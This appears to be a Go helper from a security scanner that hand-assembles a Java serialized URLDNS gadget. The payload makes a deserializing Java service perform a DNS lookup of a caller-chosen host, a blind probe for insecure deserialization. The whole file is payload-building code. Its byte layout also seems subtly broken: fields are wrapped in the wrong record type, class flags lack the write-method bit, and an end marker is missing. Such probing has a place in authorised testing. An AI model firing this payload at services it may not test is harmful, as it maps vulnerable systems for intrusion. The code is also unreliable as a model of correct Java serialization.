package dsl

import (
	"bytes"
	"encoding/binary"
	"net/url"
	"strings"
)

// javaURLDNS builds a Java serialized URLDNS gadget (HashMap → URL) that
// triggers a DNS lookup of the destination host during deserialization.
// Destination may be a bare host or a URL; only the host is used.
func javaURLDNS(dest string) []byte {
	host := dest
	if u, err := url.Parse(dest); err == nil && u.Host != "" {
		host = u.Hostname()
	}
	host = strings.TrimSpace(host)
	if host == "" {
		host = dest
	}
	// Prefix with http:// so java.net.URL accepts it.
	u := "http://" + host

	var b bytes.Buffer
	// stream header
	b.Write([]byte{0xac, 0xed, 0x00, 0x05})
	// TC_OBJECT HashMap
	b.WriteByte(0x73) // TC_OBJECT
	writeClassDesc(&b, "java.util.HashMap", 0x05044dac243bfe76, []fieldDesc{
		{typ: 'F', name: "loadFactor"},
		{typ: 'I', name: "threshold"},
	})
	b.WriteByte(0x78) // TC_ENDBLOCKDATA for class annotation
	b.WriteByte(0x70) // TC_NULL superclass

	// classdata: blockdata with loadFactor, threshold, then buckets
	b.WriteByte(0x77) // TC_BLOCKDATA
	b.WriteByte(0x08) // length
	binary.Write(&b, binary.BigEndian, float32(0.75))
	binary.Write(&b, binary.BigEndian, int32(12))
	b.WriteByte(0x77) // TC_BLOCKDATA
	b.WriteByte(0x08)
	binary.Write(&b, binary.BigEndian, int32(16)) // capacity
	binary.Write(&b, binary.BigEndian, int32(1))  // size

	// key: URL object
	b.WriteByte(0x73) // TC_OBJECT
	writeClassDesc(&b, "java.net.URL", uint64(0xa17843941630bfec), []fieldDesc{
		{typ: 'I', name: "hashCode"},
		{typ: 'I', name: "port"},
		{typ: 'L', name: "authority", class: "Ljava/lang/String;"},
		{typ: 'L', name: "file", class: "Ljava/lang/String;"},
		{typ: 'L', name: "host", class: "Ljava/lang/String;"},
		{typ: 'L', name: "protocol", class: "Ljava/lang/String;"},
		{typ: 'L', name: "ref", class: "Ljava/lang/String;"},
	})
	b.WriteByte(0x78) // TC_ENDBLOCKDATA
	b.WriteByte(0x70) // TC_NULL super

	binary.Write(&b, binary.BigEndian, int32(-1)) // hashCode = -1 → recompute → DNS
	binary.Write(&b, binary.BigEndian, int32(-1)) // port
	writeString(&b, host)                         // authority
	writeString(&b, "")                           // file
	writeString(&b, host)                         // host
	writeString(&b, "http")                       // protocol
	b.WriteByte(0x70)                             // ref = null

	// value: Boolean.TRUE (anything non-null)
	b.WriteByte(0x73)
	writeClassDesc(&b, "java.lang.Boolean", uint64(0xcd207280d59cfaee), []fieldDesc{
		{typ: 'Z', name: "value"},
	})
	b.WriteByte(0x78)
	b.WriteByte(0x70)
	b.WriteByte(0x01) // true

	_ = u // URL form kept for clarity; fields use host/protocol separately
	return b.Bytes()
}

type fieldDesc struct {
	typ   byte
	name  string
	class string // for typ 'L'
}

func writeClassDesc(b *bytes.Buffer, name string, suid uint64, fields []fieldDesc) {
	b.WriteByte(0x72) // TC_CLASSDESC
	writeUTF(b, name)
	binary.Write(b, binary.BigEndian, suid)
	b.WriteByte(0x02)                             // SC_SERIALIZABLE
	binary.Write(b, binary.BigEndian, int16(len(fields)))
	for _, f := range fields {
		b.WriteByte(f.typ)
		writeUTF(b, f.name)
		if f.typ == 'L' || f.typ == '[' {
			b.WriteByte(0x74) // TC_STRING for class name
			writeUTF(b, f.class)
		}
	}
}

func writeString(b *bytes.Buffer, s string) {
	b.WriteByte(0x74) // TC_STRING
	writeUTF(b, s)
}

func writeUTF(b *bytes.Buffer, s string) {
	binary.Write(b, binary.BigEndian, uint16(len(s)))
	b.WriteString(s)
}
